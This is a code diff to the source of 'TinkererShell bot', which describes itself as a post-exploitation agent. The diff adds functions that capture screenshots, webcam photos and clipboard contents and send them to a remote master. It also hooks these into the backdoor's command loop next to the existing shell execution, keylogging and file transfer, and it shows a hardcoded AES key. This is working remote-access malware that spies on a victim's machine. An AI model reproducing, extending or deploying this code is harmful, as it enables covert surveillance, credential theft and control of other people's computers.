@@ -1,29 +1,32 @@
-#!/usr/bin/python
+#!/usr/bin/python3.7
 # -*- coding: utf-8 -*-
 """TinkererShell bot, a simple agent for post exploitation.\n"""
 
 # Written By Ananke: https://github.com/4n4nk3
-import json
-import os
+import sys
+
+sys.path.append('./modules/')
 import shutil
 import socket
 import subprocess
-import sys
+import os
 import tempfile
 import threading
-import time
+import pyperclip
+from time import sleep
 from base64 import b64encode, b64decode
 from filecmp import cmp
 from pathlib import Path
-
-# pycryptodome
-from Crypto.Cipher import AES
-# tendo
+import pyscreenshot as ImageGrab
+import cv2
+from io import BytesIO
 from tendo import singleton
 
 # Importing module for autostart written by Jonas Wagner
 # http://29a.ch/2009/3/17/autostart-autorun-with-python
 import autorun
+
+from my_crypt_func import encode_aes, decode_aes
 
 # Activating persistence (True)
 persistenceactivation = False
@@ -128,12 +131,12 @@ def sender(data_to_send: str) -> None:
     length_crypt = encode_aes(length)
     # Sending the length and wait. Then send data
     s.send(bytes(length_crypt, 'utf-8'))
-    time.sleep(1)
+    sleep(1)
     s.send(bytes(encoded, 'utf-8'))
 
 
 def command_executor(command: str):
-    """Execute a command in the system shell ans send its output to the master.\n"""
+    """Execute a command in the system shell and send its output to the master.\n"""
     try:
         proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                 stdin=subprocess.PIPE)
@@ -233,7 +236,7 @@ def keylogs_stop():
 
 
 def keylogs_download():
-    """Send keylogged data to the master and delete it from victim host.\n"""
+    """Sends keylogged data to the master and delete it from victim host.\n"""
     try:
         with open(keylogfile, 'rb') as f_kd:
             keylogged_data = b64decode(f_kd.read()).decode('utf-8')
@@ -247,6 +250,53 @@ def keylogs_download():
         cleaner.close()
     except Exception as exception:
         print(exception)
+
+
+# TODO: Test on Windows
+def screenshot():
+    """Takes a screenshot of bot's monitors and sends it to the master.\n"""
+    buffer = BytesIO()
+    try:
+        im = ImageGrab.grab()
+        im.save(buffer, format='PNG')
+        im.close()
+        b64_str = str(b64encode(buffer.getvalue()))
+        sender(b64_str[2:-1])
+    except Exception as exception:
+        sender('reachedexcept')
+        sender(str(exception))
+
+
+# TODO: Test on Windows
+def webcam_pic():
+    """Takes a picture with bot's webcam and sends it to the master.\n"""
+    try:
+        video_capture = cv2.VideoCapture(0)
+        # Check success
+        if video_capture.isOpened():
+            # Read picture. ret === True on success
+            ret, frame = video_capture.read()
+            # Close device
+            video_capture.release()
+            is_success, buffer = cv2.imencode(".png", frame)
+            io_buf = BytesIO(buffer)
+            b64_str = str(b64encode(io_buf.getvalue()))
+            sender(b64_str[2:-1])
+        else:
+            sender('reachedexcept')
+            sender('Can\'t access any webcam!')
+    except Exception as exception:
+        sender('reachedexcept')
+        sender(str(exception))
+
+
+# TODO: Test on Windows
+def clip_copy():
+    """Sends bot's clipboard content to the master.\n"""
+    try:
+        sender('Clipboard content:\n' + pyperclip.paste())
+    except Exception as exception:
+        sender(str(exception))
 
 
 def downloader():
@@ -279,32 +329,6 @@ def uploader():
             sender(str(exception))
     else:
         sender('Operation aborted\n')
-
-
-def encode_aes(text_input: str) -> str:
-    """Encode a string and output an json in string form.\n"""
-    secret = b'4n4nk353hlli5w311d0n3andI1ik3it!'
-    cipher = AES.new(secret, AES.MODE_EAX)
-    ciphertext, tag = cipher.encrypt_and_digest(bytes(text_input, 'utf-8'))
-    lista = [ciphertext, tag, cipher.nonce]
-    json_k = ['ciphertext', 'tag', 'nonce']
-    json_v = [b64encode(x).decode('utf-8') for x in lista]
-    return json.dumps(dict(zip(json_k, json_v)))
-
-
-def decode_aes(json_input: str) -> str:
-    """Decode a string in json form and output a string.\n"""
-    try:
-        b64 = json.loads(json_input)
-        json_k = ['ciphertext', 'tag', 'nonce']
-        jv = {k: b64decode(b64[k]) for k in json_k}
-        secret = b'4n4nk353hlli5w311d0n3andI1ik3it!'
-        cipher = AES.new(secret, AES.MODE_EAX, nonce=jv['nonce'])
-        cleared = (cipher.decrypt_and_verify(jv['ciphertext'], jv['tag'])).decode('utf-8')
-        return cleared
-    except Exception as exception:
-        print(exception)
-        print("Incorrect decryption")
 
 
 # =================================================================================================
@@ -405,13 +429,13 @@ def backdoor():
                 except Exception as exception:
                     print(exception)
                     print('>>> New attempt in 2 min')
-                    time.sleep(30)
+                    sleep(30)
                     print('>>> New attempt in 1,5 min')
-                    time.sleep(30)
+                    sleep(30)
                     print('>>> New attempt in 1 min')
-                    time.sleep(30)
+                    sleep(30)
                     print('>>> New attempt in 30 sec')
-                    time.sleep(30)
+                    sleep(30)
             if thr_exit.isSet():
                 break
             # Sending information relatives to the infected system
@@ -423,7 +447,7 @@ def backdoor():
             length_crypt = encode_aes(length)
             # Sending the length and wait. Then send data
             first_s.send(bytes(length_crypt, 'utf-8'))
-            time.sleep(1)
+            sleep(1)
             first_s.send(bytes(encoded, 'utf-8'))
             print('Connection successful')
             lengthcrypt = first_s.recv(1024).decode('utf-8')
@@ -433,7 +457,7 @@ def backdoor():
                 encrypted_received_data += first_s.recv(1024).decode('utf-8')
             new_port = int(decode_aes(encrypted_received_data))
             print('New port is gonna be {}'.format(new_port))
-            time.sleep(5)
+            sleep(5)
             first_s.close()
             # Connecting to the client on the new port
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -444,7 +468,7 @@ def backdoor():
             length_crypt = encode_aes(length)
             # Sending the length and wait. Then send data
             s.send(bytes(length_crypt, 'utf-8'))
-            time.sleep(1)
+            sleep(1)
             s.send(bytes(encoded, 'utf-8'))
             break
 
@@ -476,6 +500,12 @@ def backdoor():
                         downloader()
                     elif received_command == 'SHupload':
                         uploader()
+                    elif received_command == 'SHscreenshot':
+                        screenshot()
+                    elif received_command == 'SHwebcampic':
+                        webcam_pic()
+                    elif received_command == 'SHclipboard':
+                        clip_copy()
                     elif received_command == 'SHkeylogstatus':
                         keylogs_status()
                     elif received_command == 'SHkeylogstart':
@@ -514,7 +544,7 @@ def backdoor():
         print('Connection closed')
         if thr_exit.isSet():
             break
-        time.sleep(120)
+        sleep(120)
     return True
 
 
@@ -526,9 +556,4 @@ thread1 = threading.Thread(name='sic1', target=keylogger, args=[fd_temp]).start(
 # Backdoor's thread
 thread2 = threading.Thread(name='sic2', target=backdoor).start()
 
-# TODO: Add function to kill a single bot
-# TODO: Split source in modules
-# TODO: Keylogger add clipboard (trigger on ctrl+c and ctrl+v)
-# TODO: Add active window recognition
-# TODO: Add screenshooter
-# TODO: Add Webcam and microphone
+# TODO: Add Webcam stream and microphone
